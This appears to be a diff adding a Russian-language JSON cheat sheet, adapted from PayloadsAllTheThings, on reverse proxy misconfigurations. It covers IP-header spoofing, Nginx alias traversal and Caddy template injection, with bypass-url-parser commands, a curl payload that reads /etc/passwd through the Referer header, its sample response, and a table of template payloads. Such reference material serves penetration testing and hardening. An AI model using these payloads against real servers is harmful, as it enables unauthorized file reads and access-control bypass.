@@ -1,0 +1,150 @@
+{
+  "category": "Reverse Proxy Misconfigurations",
+  "source": "PayloadsAllTheThings/Reverse Proxy Misconfigurations/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое обратный прокси и где ломается",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Обратный прокси стоит между клиентом и бэкендами: пересылает запросы, прячет внутреннюю инфраструктуру, часто балансирует нагрузку и кэширует.\nМисконфиги прокси ведут к проблемам:\n• Неправильный контроль доступа → попадание на внутренние/защищённые эндпоинты.\n• Отсутствие санитизации в proxy_pass / location → directory traversal, чтение чужих файлов.\n• Доверие к клиентским заголовкам (X-Forwarded-For, X-Real-IP, True-Client-IP) → подмена IP, обход ограничений по адресу.\nИтог: несанкционированный доступ, traversal, утечка внутренних ресурсов."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы",
+      "language": "text",
+      "tags": ["methodology", "tools"],
+      "body": "yandex/gixy — статический анализатор конфигов Nginx.\nMegaManSec/Gixy-Next — активно поддерживаемый Python3-форк gixy.\nshiblisec/Kyubi — поиск alias-traversal мисконфигов Nginx (off-by-slash).\nlaluka/bypass-url-parser — перебирает МНОГО обходов URL, чтобы достучаться до 40X-защищённой страницы."
+    },
+    {
+      "subcategory": "Обход контролей доступа",
+      "title": "bypass-url-parser — обход 40X-защищённого эндпоинта",
+      "language": "bash",
+      "tags": ["access-control", "bypass", "403"],
+      "body": "bypass-url-parser -u \"http://127.0.0.1/juicy_403_endpoint/\" -s 8.8.8.8 -d\nbypass-url-parser -u /path/urls -t 30 -T 5 -H \"Cookie: me_iz=admin\" -H \"User-agent: test\"\nbypass-url-parser -R /path/request_file --request-tls -m \"mid_paths, end_paths\""
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "Подмена клиентских заголовков IP",
+      "language": "text",
+      "tags": ["header", "spoofing", "x-forwarded-for"],
+      "body": "Заголовки X-Forwarded-For, X-Real-IP и True-Client-IP — обычные HTTP-заголовки, поэтому клиент может выставить или переопределить их, если контролирует часть пути трафика. Особенно при прямом подключении к серверу приложения или когда прокси не фильтрует/не валидирует эти заголовки.\nИспользуй для подмены исходного IP: обход white-list по адресу, доступ к admin-панелям \"только для 127.0.0.1\", обход rate-limit и гео-ограничений."
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Forwarded-For — цепочка прокси",
+      "language": "http",
+      "tags": ["header", "x-forwarded-for", "spoofing"],
+      "body": "X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3"
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Forwarded-For — как формируется и переопределяется",
+      "language": "text",
+      "tags": ["header", "x-forwarded-for"],
+      "body": "X-Forwarded-For используется, чтобы определить исходный IP клиента, подключающегося к серверу через HTTP-прокси или балансировщик.\nКогда клиент идёт через прокси/балансировщик, прокси добавляет X-Forwarded-For с реальным IP клиента.\nЕсли прокси несколько (запрос проходит через цепочку), каждый прокси дописывает адрес, с которого получил запрос, через запятую.\nNginx может переопределить заголовок реальным IP клиента:\nproxy_set_header X-Forwarded-For $remote_addr;"
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Real-IP — один адрес вместо цепочки",
+      "language": "text",
+      "tags": ["header", "x-real-ip"],
+      "body": "X-Real-IP — кастомный заголовок, часто используется Nginx и некоторыми прокси для передачи исходного IP клиента. В отличие от цепочки X-Forwarded-For, X-Real-IP содержит только один IP — адрес клиента, подключившегося к первому прокси."
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "True-Client-IP — заголовок провайдеров (Akamai)",
+      "language": "text",
+      "tags": ["header", "true-client-ip", "akamai"],
+      "body": "True-Client-IP — заголовок, разработанный и стандартизованный некоторыми провайдерами, в частности Akamai, для проброса исходного IP клиента через их инфраструктуру."
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Off-by-slash — логика матчинга location",
+      "language": "text",
+      "tags": ["nginx", "alias-traversal", "off-by-slash"],
+      "body": "Nginx сопоставляет URI запроса с location-блоками. Наличие/отсутствие слеша в location меняет логику матчинга:\n• location /app/  → матчит /app/, /app/foo, /app/bar/123 и т.д.\n• location /app   (без слеша) → матчит /app* (т.е. /application, /appfile и т.д.)"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Off-by-slash — разница location со слешем и без",
+      "language": "nginx",
+      "tags": ["nginx", "alias-traversal", "off-by-slash"],
+      "body": "server {\n  location /app/ {\n    # Handles /app/ and anything below, e.g., /app/foo\n  }\n  location /app {\n    # Handles only /app with nothing after OR routes like /application, /appzzz\n  }\n}"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Уязвимый alias без слеша → traversal",
+      "language": "nginx",
+      "tags": ["nginx", "alias-traversal", "directory-traversal"],
+      "body": "location /styles {\n  alias /path/css/;\n}"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Эксплуатация alias-traversal",
+      "language": "text",
+      "tags": ["nginx", "alias-traversal", "directory-traversal"],
+      "body": "Пример уязвимой конфигурации: запрос /styles../secret.txt резолвится в /path/styles/../secret.txt.\nЗа счёт того, что location без слеша (/styles) матчит /styles.., слеш после имени location \"съедается\", и ../ выводит за пределы алиаса."
+    },
+    {
+      "subcategory": "NGINX misconfig (доступ к внутренним файлам)",
+      "title": "Missing Root Location — глобальный root утекает наружу",
+      "language": "text",
+      "tags": ["nginx", "root-location", "file-read"],
+      "body": "Директива root /etc/nginx; задаёт корневую директорию сервера для статики.\nЕсли в конфиге нет корневого location /, root применяется глобально.\nЗапрос к /nginx.conf зарезолвится в /etc/nginx/nginx.conf — то есть отдаст сам конфиг сервера."
+    },
+    {
+      "subcategory": "NGINX misconfig (доступ к внутренним файлам)",
+      "title": "Missing Root Location — уязвимый конфиг",
+      "language": "nginx",
+      "tags": ["nginx", "root-location", "file-read"],
+      "body": "server {\n  root /etc/nginx;\n\n  location /hello.txt {\n    try_files $uri $uri/ =404;\n    proxy_pass http://127.0.0.1:8080/;\n  }\n}"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy templates — SSTI через Go-шаблоны",
+      "language": "text",
+      "tags": ["caddy", "template-injection", "ssti"],
+      "body": "Конфиг Caddy с директивой templates рендерит динамический контент через Go-шаблоны. Caddy обрабатывает строку ответа как шаблон и интерполирует любые переменные (синтаксис Go template) из указанного заголовка запроса.\nЛюбое содержимое в фигурных скобках вычисляется, включая данные из недоверенного ввода. Функция readFile доступна в шаблонах Caddy, поэтому ввод атакующего заставляет Caddy реально прочитать файл и вставить его содержимое в HTTP-ответ."
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy — уязвимый конфиг с templates",
+      "language": "text",
+      "tags": ["caddy", "template-injection", "config"],
+      "body": ":80 {\n    root * /\n    templates\n    respond \"You came from {http.request.header.Referer}\"\n}"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy — чтение /etc/passwd через Referer",
+      "language": "bash",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "curl -H 'Referer: {{readFile \"etc/passwd\"}}' http://localhost/"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy — ответ с содержимым /etc/passwd",
+      "language": "http",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "HTTP/1.1 200 OK\nContent-Length: 716\nContent-Type: text/plain; charset=utf-8\nServer: Caddy\nDate: Thu, 24 Jul 2025 08:00:50 GMT\n\nYou came from root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy templates — функции для эксплуатации",
+      "language": "table",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Описание"],
+          "rows": [
+            ["{{env \"VAR_NAME\"}}", "Получить переменную окружения"],
+            ["{{listFiles \"/\"}}", "Список всех файлов в директории"],
+            ["{{readFile \"path/to/file\"}}", "Прочитать файл"]
+          ]
+        }
+      }
+    }
+  ]
+}
